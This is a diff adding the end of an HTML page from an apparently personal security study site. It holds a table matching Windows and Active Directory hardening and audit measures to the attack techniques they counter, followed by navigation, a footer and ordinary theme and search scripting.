+<th>Counters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Logging</td>
+<td>Sysmon + 4688 cmdline + 4104 + WEF→SIEM</td>
+<td>Every phase, anti-forensics</td>
+</tr>
+<tr>
+<td>Credential</td>
+<td>LAPS, gMSA, Protected Users, Credential Guard, RunAsPPL</td>
+<td>PtH, PtT, LSASS dumping</td>
+</tr>
+<tr>
+<td>Kerberos</td>
+<td>Disable RC4, reset krbtgt, AES, AuthN Policy</td>
+<td>Kerberoast, golden ticket</td>
+</tr>
+<tr>
+<td>Architecture</td>
+<td>Tiering, PAW, LAPS</td>
+<td>Lateral movement, privilege escalation</td>
+</tr>
+<tr>
+<td>Network/protocol</td>
+<td>LDAP signing+CB, SMB signing, disable NTLM, EPA</td>
+<td>LDAP/NTLM relay</td>
+</tr>
+<tr>
+<td>AD monitoring</td>
+<td>Audit 4662, 4769 EncType, 4624 Type 9</td>
+<td>DCSync, Kerberoast, PtH</td>
+</tr>
+</tbody>
+</table>
+<p>All of the content above provides a foundation for running detection and incident response in Windows/AD environments at a detailed technical level: from the bytes within a hive/ticket/token all the way to the specific Event ID corresponding to each attack technique.</p>
+<hr />
+<h2 id="ch03-my-notes">My notes</h2>
+<blockquote>
+<p><em>Personal notes: points I previously misunderstood, areas I'm still exploring, or lessons from hands-on practice — updated over time.</em></p>
+</blockquote>
+</section>
+      <nav class="pager"><a class="pg prev" href="ch02.html"><span>← Previous</span><b>02 · Linux</b></a><a class="pg next" href="ch04.html"><span>Next →</span><b>04 · Cryptography &amp; Foundations</b></a></nav>
+    </main>
+    <footer class="site-foot">
+      <p>Written & shared by <span class="name">Fee</span> · free for learning purposes.
+      &nbsp;·&nbsp; <a href="https://github.com/fee-191" target="_blank" rel="noopener">GitHub</a>
+      &nbsp;·&nbsp; <a href="https://linkedin.com/in/leduongphi191" target="_blank" rel="noopener">LinkedIn</a></p>
+      <p>Educational content for defensive purposes. Practice legally, only on systems you are authorized to test.</p>
+    </footer>
+  </div>
+</div>
+<script>
+const root=document.documentElement;
+const THEMES=['light','dark','wibu'];
+const ICON={light:'☀️',dark:'🌙',wibu:'🌸'};
+function curTheme(){return root.getAttribute('data-theme')||'light';}
+function syncTheme(){const c=curTheme();document.querySelectorAll('.themeBtn').forEach(b=>b.textContent=ICON[c]||'☀️');}
+function setTheme(t){if(t==='light')root.removeAttribute('data-theme');else root.setAttribute('data-theme',t);localStorage.setItem('kb-theme',t);syncTheme();}
+syncTheme();
+document.querySelectorAll('.themeBtn').forEach(b=>b.addEventListener('click',()=>{
+  const i=THEMES.indexOf(curTheme());setTheme(THEMES[(i+1)%THEMES.length]);
+}));
+const navChapters=[...document.querySelectorAll('.nav-chapter')];
+document.querySelectorAll('.nav-sub, .nav-ch-title').forEach(a=>a.addEventListener('click',()=>{if(window.innerWidth<=980)document.querySelector('.sidebar').classList.remove('show');}));
+// Đánh dấu mục con đang đọc trong chương hiện tại
+const cur=document.querySelector('.nav-chapter.active');
+if(cur){
+  const heads=[...document.querySelectorAll('.chapter h2[id]')];
+  const links=new Map([...cur.querySelectorAll('.nav-sub')].map(a=>[a.getAttribute('href').slice(1),a]));
+  const obs=new IntersectionObserver((es)=>{es.forEach(e=>{if(e.isIntersecting){
+    links.forEach(a=>a.classList.remove('here'));
+    const a=links.get(e.target.id); if(a){a.classList.add('here');a.scrollIntoView({block:'nearest'});}
+  }});},{rootMargin:'-10% 0px -80% 0px',threshold:0});
+  heads.forEach(h=>obs.observe(h));
+}
+const box=document.getElementById('q');
+if(box)box.addEventListener('input',()=>{const q=box.value.trim().toLowerCase();
+  navChapters.forEach(c=>{const title=c.querySelector('.nav-ch-title').innerText.toLowerCase();
+    const subs=[...c.querySelectorAll('.nav-sub')];let any=title.includes(q);
+    subs.forEach(s=>{const m=s.innerText.toLowerCase().includes(q);s.style.display=(!q||m)?'block':'none';if(m)any=true;});
+    c.style.display=(!q||any)?'block':'none';});
+});
+const mb=document.getElementById('menu');if(mb)mb.addEventListener('click',()=>document.querySelector('.sidebar').classList.toggle('show'));
+// ←/→ chuyển chương
+document.addEventListener('keydown',e=>{
+  if(e.target.tagName==='INPUT'||e.metaKey||e.ctrlKey||e.altKey)return;
+  const p=document.querySelector('link[rel=prev]'),n=document.querySelector('link[rel=next]');
+  if(e.key==='ArrowLeft'&&p)location.href=p.href;
+  if(e.key==='ArrowRight'&&n)location.href=n.href;
+});
+</script>
+</body>
+</html>
